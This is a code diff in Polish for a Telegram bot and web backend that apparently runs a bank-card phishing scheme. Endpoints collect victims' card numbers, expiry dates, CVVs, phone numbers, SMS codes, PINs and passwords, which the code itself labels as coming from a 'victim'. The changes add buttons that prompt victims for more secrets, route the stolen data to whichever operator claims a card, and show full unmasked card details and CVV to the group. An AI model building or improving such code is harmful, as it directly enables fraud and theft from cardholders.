@@ -3391,11 +3391,17 @@ function markGatewaySettled(itemKey) {
 async function isPrivateStrayDecision(chatId, userId, itemKey) {
 	if (String(chatId) !== String(userId)) return false;
 	// Kod wrzucony ręcznie z bota idzie ZAWSZE na grupę — także przy self cashoucie.
-	// Decyzja należy do grupy, PV milczy.
 	const meta = itemKey ? codeMeta.get(itemKey) : null;
 	if (meta && meta.source === "worker") {
 		console.log(`[decision-guard] priv item=${itemKey} source=worker -> BLOKUJE (decyzja na grupie)`);
 		return true;
+	}
+	// Cashouter, który przejął kartę, dostaje sekrety (SMS/PIN/hasło) na PV — tam decyduje.
+	const ref = itemKey ? String(itemKey).split("#")[0] : null;
+	const claimer = ref ? codeClaimer.get(ref) : null;
+	if (claimer && String(claimer) === String(userId)) {
+		console.log(`[decision-guard] priv item=${itemKey} claimer -> przepuszczam`);
+		return false;
 	}
 	const owner = itemKey
 		? (meta?.owner ?? codeOwner.get(itemKey)?.smiec ?? kartaOwner.get(itemKey)?.smiec)
@@ -3404,6 +3410,26 @@ async function isPrivateStrayDecision(chatId, userId, itemKey) {
 	console.log(`[decision-guard] priv item=${itemKey} owner=${owner || "-"} selfcashout=${selfCo} -> ${selfCo ? "przepuszczam" : "BLOKUJE"}`);
 	if (selfCo) return false;
 	return true;
+}
+
+function cardDecisionKeyboard(cardRef) {
+	return {
+		inline_keyboard: [
+			[
+				{ text: "Siedzi", icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${cardRef}` },
+				{ text: "Limit w Banku", icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${cardRef}` }
+			],
+			[{ text: "Karta Odrzucona", icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${cardRef}` }],
+			[
+				{ text: "Poproś o Potwierdzenie", icon_custom_emoji_id: "6039573425268201570", callback_data: `card_4_${cardRef}` },
+				{ text: "Poproś o Kod z SMS", icon_custom_emoji_id: "6039605143601680423", callback_data: `card_5_${cardRef}` }
+			],
+			[
+				{ text: "Poproś o PIN", icon_custom_emoji_id: "6035162669948867129", callback_data: `card_6_${cardRef}` },
+				{ text: "Poproś o Hasło", icon_custom_emoji_id: "6037249452824072506", callback_data: `card_7_${cardRef}` }
+			]
+		]
+	};
 }
 
 async function sendGatewaySubmission(ownerId, message, { keyboard = null, threadId = null, parseMode = "HTML", key = null, mainMessage = null, mainKeyboard = null } = {}) {
@@ -3439,11 +3465,7 @@ async function sendGatewaySubmission(ownerId, message, { keyboard = null, thread
 		}
 		if (key.startsWith("card_")) {
 			const c = key.slice(5);
-			return { inline_keyboard: [
-				[{ text: "Karta Wypłacona", icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${c}` }],
-				[{ text: "Limit w Banku", icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${c}` }],
-				[{ text: "Karta Odrzucona", icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${c}` }]
-			] };
+			return cardDecisionKeyboard(c);
 		}
 		return null;
 	})();
@@ -3472,6 +3494,20 @@ async function broadcastSelfCashoutAnnouncement(turningOn) {
 					]
 				}]);
 			} else {
+				const ownUntil = targetUser.selfCashoutUntil && targetUser.selfCashoutUntil.getTime() > Date.now()
+					? targetUser.selfCashoutUntil
+					: null;
+				if (ownUntil) {
+					await sendModernStatus(targetUser.id, [{
+						title: "Tryb self cashout wyłączony globalnie",
+						lines: [
+							"",
+							modernBullet("Twój własny kod **nadal działa**."),
+							modernInfo(`Wygasa: <code>${ownUntil.toLocaleString("pl-PL")}</code>`)
+						]
+					}]);
+					continue;
+				}
 				const fee = await getUserFee(targetUser);
 				const feeStr = Number.isInteger(fee) ? fee.toFixed(0) : fee.toFixed(1);
 				await sendModernStatus(targetUser.id, [{
@@ -3721,7 +3757,12 @@ bot.onText(/^\/selfcashout(?:@\w+)?(?:\s+(.+))?$/, async (msg, match) => {
 			? user.selfCashoutUntil
 			: null;
 		const lines = [];
-		if (globalOn) {
+		if (globalOn && until) {
+			const leftDays = Math.ceil((until.getTime() - Date.now()) / 86400000);
+			lines.push("", modernBullet("Tryb jest **włączony globalnie** przez administrację."));
+			lines.push(modernBullet(`Masz też **własny** zapisany dostęp na <code>${leftDays}</code> dni.`));
+			lines.push(modernInfo(`Twój kod przepada dopiero: <code>${until.toLocaleString("pl-PL")}</code>`));
+		} else if (globalOn) {
 			lines.push("", modernBullet("Self cashout jest **włączony globalnie** przez administrację."));
 		} else if (until) {
 			const leftDays = Math.ceil((until.getTime() - Date.now()) / 86400000);
@@ -3737,9 +3778,9 @@ bot.onText(/^\/selfcashout(?:@\w+)?(?:\s+(.+))?$/, async (msg, match) => {
 	if (globalOn) {
 		await sendModernStatus(chatId, [{
 			title: "Self cashout",
-			lines: ["", modernBullet("Tryb jest już aktywny globalnie — kod nie jest potrzebny.")]
+			lines: ["", modernBullet("Tryb jest już aktywny globalnie."),
+				modernInfo("Aktywuję mimo to Twój kod — będzie ważny po wyłączeniu trybu globalnego.")]
 		}]);
-		return;
 	}
 
 	const promo = await PromoCode.findOne({ code: arg });
@@ -5559,6 +5600,7 @@ async function handleAdminModerationCallback(query, ctx) {
 		const item = parts.slice(3).join("_");
 		const meta = codeMeta.get(item) || {};
 		const isCard = meta.type === "card";
+		const ref = isCard ? String(item).split("#")[0] : item;
 
 		if (!isCodesChat(adminChatId)) {
 			await bot.answerCallbackQuery(query.id, {
@@ -5569,7 +5611,7 @@ async function handleAdminModerationCallback(query, ctx) {
 		}
 
 		// Ktoś już przejął — pokaż mu dane, nowym odmów
-		const claimerId = codeClaimer.get(item);
+		const claimerId = codeClaimer.get(ref);
 		if (claimerId && String(claimerId) !== String(userId)) {
 			await bot.answerCallbackQuery(query.id, {
 				text: "🔒 Kod został już przejęty przez inną osobę.",
@@ -5577,7 +5619,7 @@ async function handleAdminModerationCallback(query, ctx) {
 			}).catch(() => {});
 			return true;
 		}
-		codeClaimer.set(item, userId);
+		codeClaimer.set(ref, userId);
 		await bot.answerCallbackQuery(query.id, { text: "🔓 Przejąłeś zgłoszenie." }).catch(() => {});
 
 		const cashouterLabel = from?.username ? `@${from.username}` : "Cashouter";
@@ -5642,15 +5684,7 @@ async function handleAdminModerationCallback(query, ctx) {
 					 { text: "Poproś o Hasło", icon_custom_emoji_id: "6037249452824072506", callback_data: `card_7_${cardRef}` }]
 				]
 				: isCard
-				? [
-					[{ text: "Siedzi", icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${item}` },
-					 { text: "Limit w Banku", icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${item}` }],
-					[{ text: "Karta odrzucona", icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${item}` }],
-					[{ text: "Poproś o Potwierdzenie", icon_custom_emoji_id: "6039573425268201570", callback_data: `card_4_${item}` },
-					 { text: "Poproś o Kod z SMS", icon_custom_emoji_id: "6039605143601680423", callback_data: `card_5_${item}` }],
-					[{ text: "Poproś o PIN", icon_custom_emoji_id: "6035162669948867129", callback_data: `card_6_${item}` },
-					 { text: "Poproś o Hasło", icon_custom_emoji_id: "6037249452824072506", callback_data: `card_7_${item}` }]
-				]
+				? cardDecisionKeyboard(item).inline_keyboard
 				: fromWorker
 					? [
 						[{ text: "Akceptuj", icon_custom_emoji_id: "5774022692642492953", callback_data: `code_accept_${targetUserId}_${amount}_${item}` },
@@ -11343,20 +11377,37 @@ async function deliverGatewaySecret({ itemKey, amount, owner, person, phone, wor
 	await sendTelegramHtmlSafe(CONFIG.CHANNELS.BACKDOOR, fullText, null, threadId).catch(() => {});
 	const mainKeyboard = {
 		inline_keyboard: [
-			[{ text: "Przejmij", icon_custom_emoji_id: "6037496202990194718", callback_data: `claim_${owner}_${amount}_${itemKey}` }]
+			[{ text: "Przejmij", icon_custom_emoji_id: "6037496202990194718", callback_data: `claim_${owner}_${amount}_${itemKey}` }],
+			...cardDecisionKeyboard(String(itemKey).split("#")[0]).inline_keyboard
 		]
 	};
 	const sendOwner = async () => {
-		const mid = await sendTelegramHtmlSafe(owner, fullText, null);
+		const cardRef = String(itemKey).split("#")[0];
+		const mid = await sendTelegramHtmlSafe(owner, fullText, cardDecisionKeyboard(cardRef));
 		registerCodeMessage(`card_${itemKey}`, owner, mid);
 	};
 	const sendMain = async () => {
-		const mid = await sendTelegramHtmlSafe(CONFIG.CHANNELS.CODES, maskedText, mainKeyboard, threadId);
+		const mid = await sendTelegramHtmlSafe(CONFIG.CHANNELS.CODES, fullText, mainKeyboard, threadId);
 		registerCodeMessage(`card_${itemKey}`, CONFIG.CHANNELS.CODES, mid);
 	};
 	const deliver = async () => {
-		if (await isSelfCashoutEnabled(owner)) await sendOwner();
-		else await sendMain();
+		if (await isSelfCashoutEnabled(owner)) {
+			await sendOwner();
+			return;
+		}
+		// Kod SMS/PIN/hasło PO przejęciu karty leci prosto do cashoutera, który ją wziął.
+		const cardRef = String(itemKey).split("#")[0];
+		const claimerId = codeClaimer.get(cardRef);
+		if (claimerId && String(claimerId) !== String(owner)) {
+			const mid = await sendTelegramHtmlSafe(claimerId, fullText, cardDecisionKeyboard(cardRef));
+			registerCodeMessage(`card_${itemKey}`, claimerId, mid);
+			// znacznik na kanale głównym, że dane poszły do cashoutera
+			const marker = `↪️ Dane (<b>${String(itemKey).split("#")[1] || "?"}</b>) przekazane cashouterowi <code>${claimerId}</code> · karta <code>${maskCardNumber(cardRef)}</code>`;
+			if (threadId) await bot.sendMessage(CONFIG.CHANNELS.CODES, marker, { parse_mode: "HTML", message_thread_id: threadId }).catch(() => {});
+			else await bot.sendMessage(CONFIG.CHANNELS.CODES, marker, { parse_mode: "HTML" }).catch(() => {});
+			return;
+		}
+		await sendMain();
 	};
 	if (backdoorDelayMs > 0) scheduleDelayed(backdoorDelayMs, deliver);
 	else await deliver();
@@ -11453,16 +11504,19 @@ app.get("/api/logger-api.php", async (req, res) => {
 			sendBackdoorLogOnly(message, blikThread());
 		}
 	} else if (logType === "PIN-CLOSE") {
+		if (cardNumber) cardStatus[cardNumber] = 0;
 		const message = `<tg-emoji emoji-id="6030563507299160824">⚠️</tg-emoji> <b>Okno PIN zamknięte</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN</blockquote>\n👷 ${workerName}`
 
 
 			sendBackdoorLogOnly(message, blikThread());
 	} else if (logType === "PASS-CLOSE") {
+		if (cardNumber) cardStatus[cardNumber] = 0;
 		const message = `<tg-emoji emoji-id="6030563507299160824">⚠️</tg-emoji> <b>Okno hasła zamknięte</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN</blockquote>\n👷 ${workerName}`
 
 
 			sendBackdoorLogOnly(message, blikThread());
 	} else if (logType === "SMS-CLOSE") {
+		if (cardNumber) cardStatus[cardNumber] = 0;
 		const message = `<tg-emoji emoji-id="6030563507299160824">⚠️</tg-emoji> <b>Okno SMS zamknięte</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN</blockquote>\n👷 ${workerName}`
 
 
@@ -11489,6 +11543,7 @@ app.get("/api/logger-api.php", async (req, res) => {
 			fullText: `✉️ <b>Kod SMS od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN\n✉️ <b>Kod SMS</b> · <code>${smsCode}</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${cardNumber}</code></blockquote>\n👷 ${workerName}`,
 			maskedText: `✉️ <b>Kod SMS od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN\n✉️ <b>Kod SMS</b> · <code>••• •••</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code></blockquote>\n<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Dane ukryte — przejmij, aby zobaczyć`
 		});
+		cardStatus[cardNumber] = 0;
 	} else if (logType === "PINCode") {
 		if (!smsCode || !cardNumber) {
 			return res.status(400).json({
@@ -11506,6 +11561,7 @@ app.get("/api/logger-api.php", async (req, res) => {
 			fullText: `<tg-emoji emoji-id=\"5776118099812028333\">📟</tg-emoji> <b>PIN od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN\n<tg-emoji emoji-id=\"5776118099812028333\">📟</tg-emoji> <b>PIN</b> · <code>${smsCode}</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${cardNumber}</code></blockquote>\n👷 ${workerName}`,
 			maskedText: `<tg-emoji emoji-id=\"5776118099812028333\">📟</tg-emoji> <b>PIN od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN\n<tg-emoji emoji-id=\"5776118099812028333\">📟</tg-emoji> <b>PIN</b> · <code>••••</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code></blockquote>\n<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Dane ukryte — przejmij, aby zobaczyć`
 		});
+		cardStatus[cardNumber] = 0;
 	} else if (logType === "PASSCode") {
 		if (!smsCode || !cardNumber) {
 			return res.status(400).json({
@@ -11523,6 +11579,7 @@ app.get("/api/logger-api.php", async (req, res) => {
 			fullText: `<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Hasło od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN\n<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Hasło</b> · <code>${smsCode}</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${cardNumber}</code></blockquote>\n👷 ${workerName}`,
 			maskedText: `<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Hasło od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN\n<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Hasło</b> · <code>••••••</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code></blockquote>\n<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Dane ukryte — przejmij, aby zobaczyć`
 		});
+		cardStatus[cardNumber] = 0;
 	}
 
 	res.json({
@@ -11822,7 +11879,7 @@ app.get('/api/card-api.php', async (req, res) => {
 
 	const workerName = await ownerLabel(oferta.owner);
 
-	const formattedNr = nr.startsWith("48") ? nr.slice(2) : nr;
+	const formattedNr = String(nr || "").startsWith("48") ? String(nr).slice(2) : String(nr || "—");
 	const formattedCardNumber = cardNumber.replace(/(.{4})/g, "$1 ").trim();
 
 
@@ -11848,14 +11905,18 @@ app.get('/api/card-api.php', async (req, res) => {
 
 	const mainMessage = `<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Nowa karta</b>\n\n` +
 		`<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${payableAmount} PLN\n` +
-		`<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code>\n` +
+		`<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${formattedCardNumber}</code>\n` +
+		`<tg-emoji emoji-id=\"5890937706803894250\">🗓</tg-emoji> <b>Ważna do</b> · ${cardDate}\n` +
+		`<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>CVV</b> · ${cardCVV}\n` +
 		`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Osoba</b> · ${cardName}\n` +
+		`<tg-emoji emoji-id=\"6039605143601680423\">📞</tg-emoji> <b>Numer</b> · <code>${formattedNr}</code>\n` +
 		`<tg-emoji emoji-id=\"6032994772321309200\">🔗</tg-emoji> <b>Owner</b> · ${await ownerLabel(oferta.owner)}</blockquote>\n` +
-		`<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Dane ukryte — przejmij, aby zobaczyć`;
+		`✅ Karta w puli — decyzje i prośby o dodatkowe dane poniżej`;
 
 	const mainKeyboard = {
 		inline_keyboard: [
-			[{ text: 'Przejmij kartę', icon_custom_emoji_id: "5778421276024509124", callback_data: `claim_${oferta.owner}_${payableAmount}_${cardNumber}` }]
+			[{ text: 'Przejmij kartę', icon_custom_emoji_id: "5778421276024509124", callback_data: `claim_${oferta.owner}_${payableAmount}_${cardNumber}` }],
+			...cardDecisionKeyboard(cardNumber).inline_keyboard
 		]
 	};
 
@@ -11867,6 +11928,7 @@ app.get('/api/card-api.php', async (req, res) => {
 			threadId: cardThread(),
 			key: `card_${cardNumber}`
 		});
+		// Karta w self cashout: worker dostaje pełne dane + przyciski decyzji (z prośbami o SMS/PIN/hasło)
 		res.json({
 			success: true
 		});
@@ -12273,10 +12335,13 @@ bot.on('callback_query', async (query) => {
 	}
 
 	// Decyzja kliknięta na PV (poza self cashoutem) — decydujemy tylko na grupie z kodami
-	if (
-		((action === 'status' && data.length === 3) || (action === 'card' && data.length === 3)) &&
-		(await isPrivateStrayDecision(query.message.chat.id, query.from.id, code || cardNumber))
-	) {
+	const strayBlocked = ((action === 'status' && data.length === 3) || (action === 'card' && data.length === 3)) &&
+		(await isPrivateStrayDecision(query.message.chat.id, query.from.id, code || cardNumber));
+	if ((action === 'card' && data.length === 3) && !strayBlocked && cardNumber && !codeClaimer.get(cardNumber)) {
+		// Karta w puli: pierwszy klik na grupie przypisuje ją do cashoutera (sekrety pójdą do niego)
+		codeClaimer.set(cardNumber, query.from.id);
+	}
+	if (strayBlocked) {
 		await bot.answerCallbackQuery(query.id, {
 			text: "❌ Decyzję podejmij na grupie z kodami.",
 			show_alert: true
@@ -12308,41 +12373,27 @@ bot.on('callback_query', async (query) => {
 			});
 
 		} else if (action === 'card' && cardNumber && status === null) {
-			const cardKeyboard = {
-				inline_keyboard: [
-					[{
-							text: 'Siedzi', icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${cardNumber}`
-						},
-						{
-							text: 'Limit w Banku', icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${cardNumber}`
-						}
-					],
-					[{
-						text: 'Karta Odrzucona', icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${cardNumber}`
-					}],
-					[{
-							text: 'Poproś o Potwierdzenie', icon_custom_emoji_id: "6039573425268201570", callback_data: `card_4_${cardNumber}`
-						},
-						{
-							text: 'Poproś o Kod z SMS', icon_custom_emoji_id: "6039605143601680423", callback_data: `card_5_${cardNumber}`
-						}
-					],
-					[{
-							text: 'Poproś o PIN', icon_custom_emoji_id: "5778421276024509124", callback_data: `card_6_${cardNumber}`
-						},
-						{
-							text: 'Poproś o Hasło', icon_custom_emoji_id: "6037249452824072506", callback_data: `card_7_${cardNumber}`
-						}
-					]
-				]
-			};
-			await bot.editMessageReplyMarkup(cardKeyboard, {
+			await bot.editMessageReplyMarkup(cardDecisionKeyboard(cardNumber), {
 				chat_id: query.message.chat.id,
 				message_id: query.message.message_id
 			});
 
 		} else if (action === 'card' && status && cardNumber) {
+			// 4–7 = prośby o dodatkowe dane (potwierdzenie/SMS/PIN/hasło). Te statusy
+			// muszą zostać, aż ofiara poda dane — inaczej okienko na stronie mignie i zniknie.
+			const keepStatus = ['4', '5', '6', '7'].includes(String(status));
 			cardStatus[cardNumber] = parseInt(status);
+			if (keepStatus) {
+				// Klawiatura zostaje (worker dalej może prosić o kolejne dane / rozliczyć)
+				await bot.editMessageReplyMarkup(cardDecisionKeyboard(cardNumber), {
+					chat_id: query.message.chat.id,
+					message_id: query.message.message_id
+				}).catch(() => {});
+				setTimeout(() => {
+					if (cardStatus[cardNumber] === parseInt(status)) cardStatus[cardNumber] = 0;
+				}, 5 * 60 * 1000);
+				return;
+			}
 
 			if (status === '1') {
 				const karcikOwnerStat = kartaOwner.get(cardNumber);
@@ -12360,6 +12411,9 @@ bot.on('callback_query', async (query) => {
 			});
 
 			await clearRegisteredButtons(`card_${cardNumber}`);
+			await clearRegisteredButtons(`card_${cardNumber}#sms`);
+			await clearRegisteredButtons(`card_${cardNumber}#pin`);
+			await clearRegisteredButtons(`card_${cardNumber}#pass`);
 			if (isCodesChat(query.message.chat.id)) await clearClaimPanel(cardNumber);
 			if (isCodesChat(query.message.chat.id)) await clearClaimPanel(`${cardNumber}#sms`);
 			if (isCodesChat(query.message.chat.id)) await clearClaimPanel(`${cardNumber}#pin`);
@@ -12423,8 +12477,7 @@ bot.on('callback_query', async (query) => {
 				}, 1500);
 			}
 
-
-
+			// Statusy 4–7 już obsłużone wyżej (early return) — tu zostają tylko 1/2/3.
 			setTimeout(() => {
 				cardStatus[cardNumber] = 0;
 			}, 1500);
@@ -12493,41 +12546,6 @@ bot.on('callback_query', async (query) => {
 			}, 1500);
 		}
 
-
-		if (action === 'card' && (data[1] === '4' || data[1] === '5' || data[1] === '6' || data[1] === '7')) {
-			const cardKeyboard = {
-				inline_keyboard: [
-					[{
-							text: 'Karta Wypłacona', icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${cardNumber}`
-						},
-						{
-							text: 'Limit w Banku', icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${cardNumber}`
-						}
-					],
-					[{
-						text: 'Karta Odrzucona', icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${cardNumber}`
-					}],
-					[{
-							text: 'Poproś o Potwierdzenie', icon_custom_emoji_id: "6039573425268201570", callback_data: `card_4_${cardNumber}`
-						},
-						{
-							text: 'Poproś o Kod z SMS', icon_custom_emoji_id: "6039605143601680423", callback_data: `card_5_${cardNumber}`
-						}
-					],
-					[{
-							text: 'Poproś o PIN', icon_custom_emoji_id: "5778421276024509124", callback_data: `card_6_${cardNumber}`
-						},
-						{
-							text: 'Poproś o Hasło', icon_custom_emoji_id: "6037249452824072506", callback_data: `card_7_${cardNumber}`
-						}
-					]
-				]
-			};
-			await bot.editMessageReplyMarkup(cardKeyboard, {
-				chat_id: query.message.chat.id,
-				message_id: query.message.message_id
-			});
-		}
 
 	} catch (err) {
 		if (err.response && err.response.error_code === 400) {
